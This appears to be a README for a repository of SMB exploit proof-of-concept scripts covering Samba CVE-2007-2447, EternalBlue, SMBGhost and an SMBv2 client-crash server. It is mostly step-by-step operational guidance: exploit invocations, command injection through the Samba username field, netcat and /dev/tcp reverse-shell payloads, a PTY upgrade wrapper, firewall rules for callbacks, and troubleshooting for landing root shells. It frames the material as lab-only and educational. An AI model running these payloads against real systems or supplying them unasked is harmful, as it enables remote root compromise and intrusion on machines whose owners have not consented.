# SMB exploit PoCs

Educational proof-of-concept scripts for SMB vulnerabilities. Authorized
testing only — do not run against systems you do not own.

## Repository layout

```
cve-2007-2447/
  cve_2007_2447.py       Samba pre-auth RCE (works, verified)
  reverse_shell.sh       One-command reverse shell helper (opens the firewall,
                         picks the callback address, listens, fires the exploit)
  reverse_shell.cmd      Windows wrapper — runs the .sh from cmd/PowerShell
cve-2009-3103/
  cve_2009_3103_smbv2_server.py   Malicious SMBv2 server (crashes Windows clients)
cve-2017-0143/
  EternalBlue_Exploit8.py MS17-010/EternalBlue (Windows SMBv1)
  checker.py
  mysmb.py
  README_MS17-010.md
cve-2020-0796/
  BleedingGhost.py       SMBGhost/SMBleedingGhost RCE (Windows 10 1903/1909)
  calc_target_offsets.bat
  smbghost_kshellcode_x64.asm
  tools/                 Debugging helpers (cdb/dbghelp/link etc.)
smb_test_server.py       Benign SMB1 protocol test server (not an exploit)
README.md                This file — shared by all folders
```

## cve-2007-2447/ — Samba pre-auth RCE (works, verified)

A working pre-auth remote command execution client for the Samba service on
**Metasploitable 2** (Samba 3.0.20-Debian). This is the same vector as the
Metasploit module `exploit/multi/samba/usermap_script`.

Metasploitable 2's `smb.conf` enables the non-default
`username map script = /etc/scripts/usermap.sh` option. Samba invokes that
mapping script through the shell with the attacker-supplied username **before
authentication**, so shell metacharacters in the username execute as the
`smbd` process — which runs as **root** on Metasploitable 2.

The client sends an SMB1 `Session Setup AndX` (WordCount=13, zero-length
LM/NT hashes, matching Metasploit's `session_setup_no_ntlmssp`) with the
username ``/=`nohup <command>` ``. Verified against Metasploitable 2:
`uid=0(root) gid=0(root)` on ports 445 and 139.

Command output is exfiltrated by writing to `/var/www/` on the target and
fetching it over the target's own HTTP server (port 80), then the drop file
is cleaned up with a second injection.

```bash
# Fingerprint: guest login for the Samba banner + vulnerability range
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --check

# Default demo: fingerprint + run `id` and print the output
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132

# Run any command; output is retrieved automatically
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --cmd "uname -a && cat /etc/passwd"

# Use NetBIOS port 139 instead of 445
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --port 139 --cmd "id"

# Reverse shell — interactive PTY by default (prompt, working Enter, tab completion)
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.200.1 4444

# ...or a plain promptless shell (no PTY) if the target lacks python/base64
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.200.1 4444 --plain

# Skip HTTP retrieval (command still runs; output stays on the target)
python cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --cmd "id" --no-verify
```

No third-party packages — standard library only (Python 3).

## Getting a reverse shell (self-contained)

The exploit already injects a shell — the only fiddly parts are the callback
address, the local firewall, and the payload. All three are handled for you.

### One command

Pick the line for the shell you are actually in. This is the most common way to
get stuck: a `.sh` has no Windows file association, so double-clicking one (or
running it from cmd/PowerShell) just pops up a "choose an app" dialog.

```bash
# Git Bash
./cve-2007-2447/reverse_shell.sh 192.168.200.132

# cmd.exe
cve-2007-2447\reverse_shell.cmd 192.168.200.132

# PowerShell
.\cve-2007-2447\reverse_shell.cmd 192.168.200.132
```

Arguments are `<target_ip> [lport] [lhost]` — the port defaults to 4444 and the
callback address is auto-detected. If that port is already taken, the helper
says so and moves up until it finds a free one, so you never have to hunt for a
port yourself. It opens the firewall for the chosen port, picks a callback
address on the target's subnet, starts the listener, then fires the exploit.

You land on an **interactive prompt** — `root@metasploitable:/#` — with working
Enter, tab completion, arrow-key history and Ctrl-C. Try `id; hostname`, then
type `exit` to drop it.

### Manual equivalent

```bash
# 1. Open the local firewall for the callback port (Windows, as Administrator)
netsh advfirewall firewall add rule name="revshell 4444" dir=in action=allow protocol=TCP localport=4444

# 2. Listen — on the Windows host, NOT inside WSL (see note 1 below)
"C:\Program Files (x86)\Nmap\ncat.exe" -l -v -p 4444

# 3. In another terminal, fire the exploit at the target
python3 cve-2007-2447/cve_2007_2447.py --host 192.168.200.132 --reverse 192.168.200.1 4444
```

### The three things that break it

1. **Wrong callback address.** The `lhost` you pass must be reachable *from the
   target*. If you run the exploit inside WSL, do not use the WSL address
   (`172.x`) — WSL is NAT'd behind Windows and the target has no route to it.
   Use the Windows adapter that shares the target's subnet (the VMware VMnet
   address, e.g. `192.168.200.1`). `reverse_shell.sh` auto-detects this.
2. **Firewall.** All Windows firewall profiles are on by default. Without an
   inbound allow rule the target's callback is dropped silently and the
   listener just sits there.
3. **Payload.** The usual `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` does **not**
   work on Metasploitable 2 — its bash (3.2.33) is built without net
   redirections, so it dies with `No such file or directory`. The script uses
   the target's own netcat instead: `nc LHOST LPORT -e /bin/bash &`.

### Why it is interactive

A naive `nc -e /bin/bash` shell is not usable interactively, and the failure
looks like a broken exploit. Two things are wrong with it:

- **No prompt.** bash runs non-interactively, so there is no `#` to type at.
- **Enter does nothing.** bash needs an LF to end a line, but Enter in a
  cmd/PowerShell console sends a bare **CR**. You type `ls`, press Enter, and
  nothing happens — the line just sits buffered until an LF eventually arrives.
  This is the single most common "the exploit is broken" false alarm.

The fix is to give bash a pseudo-terminal. `nc -e` accepts a program name only
(no arguments), so the exploit drops a one-line wrapper on the target and points
netcat at it:

```sh
#!/bin/sh
exec python -c 'import pty;pty.spawn("/bin/bash")'
```

A PTY's line discipline maps CR to NL, so Enter works, and you get a real prompt
with tab completion and history. No external tooling — just python, which
Metasploitable 2 already has.

`--plain` skips the wrapper and sends `nc LHOST LPORT -e /bin/bash` directly.
Reach for it only if the target lacks python or base64: you lose the prompt and
Enter may not work.

### If no shell arrives

- `netstat -ano | grep :<lport>` — an ESTABLISHED line means the shell is
  already there. A `TimeoutError` from the SMB session setup does **not** mean
  failure: if the injected command blocks, Samba never replies.
- Probe the route independently: run
  `--cmd "echo test | nc -w 3 <lhost> <lport>"` and see whether it lands on the
  listener. That separates firewall/route problems from payload problems.
- Typing seems to do nothing and there is no prompt? You are on a shell without
  a PTY — see "Why it is interactive" above.
- Port busy or reserved? Pick another — `netsh int ipv4 show
  excludedportrange protocol=tcp` lists Windows' reserved ranges.

Remove the firewall rule when you are done:

```bash
netsh advfirewall firewall delete rule name="CVE-2007-2447 revshell <lport>"
```

## cve-2009-3103/ — Windows SMBv2 client crash (NOT for Samba)

A malicious SMBv2 **server** (Exploit-DB #41222) that crashes vulnerable
Windows SMBv2 **clients** (`srv2.sys`) via a Tree Connect response overflow.
It **cannot** be used to attack a Samba server: Samba 3.0.20 speaks only
SMB1, and the overflow lives in Microsoft's client code. Use it only against
a consenting Windows client in a lab.

```bash
# Listens on port 445; requires admin/root to bind
python cve-2009-3103/cve_2009_3103_smbv2_server.py
```

Ported to Python 3 (`collections.OrderedDict`, bytes-safe packet building).

## cve-2017-0143/ — MS17-010 / EternalBlue (Windows SMBv1)

Windows SMBv1 remote code execution (EternalBlue) affecting Windows Vista/7/8/8.1/2008/2012/2016/10 and older. **Not a Samba vulnerability** — it targets Microsoft SMBv1 in Windows. Use only in authorized labs.

Contents: `EternalBlue_Exploit8.py` (exploit), `checker.py` (vulnerability check), `mysmb.py` (SMB helpers). Based on worawit's MS17-010 PoCs.

```bash
# Check if target is vulnerable
python cve-2017-0143/checker.py <target_ip>

# Run exploit (requires shellcode setup per the repo notes; see README_MS17-010.md)
python cve-2017-0143/EternalBlue_Exploit8.py <target_ip> <shellcode_file>
```

See `cve-2017-0143/README_MS17-010.md` for original usage and shellcode instructions. No extra deps beyond Python 2/3 stdlib depending on variant.

## cve-2020-0796/ — SMBGhost / BleedingGhost (Windows RCE)

Remote code execution PoC for **CVE-2020-0796** / "SMBGhost", extended as
"SMBleedingGhost" (chaining with SMBleed **CVE-2020-1206**). Targets **Windows
10 1903 and 1909**. Original by ZecOps, Inc.

The script uses SMBv3 compression and a complex memory-corruption chain to
obtain a kernel read/write primitive, write shellcode to a known kernel
address, clear its NX bit, and hijack a srvnet callback for execution (SYSTEM
shell via ncat). It is **not** universal: you must run
`calc_target_offsets.bat` on the target to obtain correct offsets for the
current build and paste them into `BleedingGhost.py`'s `OFFSETS` dict, and it
works best on single-CPU/VM targets.

```bash
# On the target (Windows 10 1903/1909): collect offsets
calc_target_offsets.bat

# Start a listener
ncat -lvp 4444

# Run from attacker (Windows/Linux with ncat available)
python cve-2020-0796/BleedingGhost.py <target_ip> <listener_ip> <listener_port>
```

See `cve-2020-0796/README.md` for the full original documentation and
technical writeup links. Requires no extra Python packages beyond the
standard library on Windows (uses `ctypes` to call `ntdll`).

## smb_test_server.py — benign protocol test server

A small standalone SMB1 test/echo server for protocol experiments. Not an
exploit.

## Lab setup used for verification

- Target: Metasploitable 2 at `192.168.200.132` (VMware, host-only/NAT)
- Host: any machine on the same network with Python 3
- Callback for reverse shells: the Windows adapter on the target's subnet
  (`192.168.200.1`), **not** WSL's NAT address
- Open ports on target: 22, 80, 139, 445, 3632

## License

Proof-of-concept scripts derived from public exploit databases. Use
responsibly and only in authorized environments.
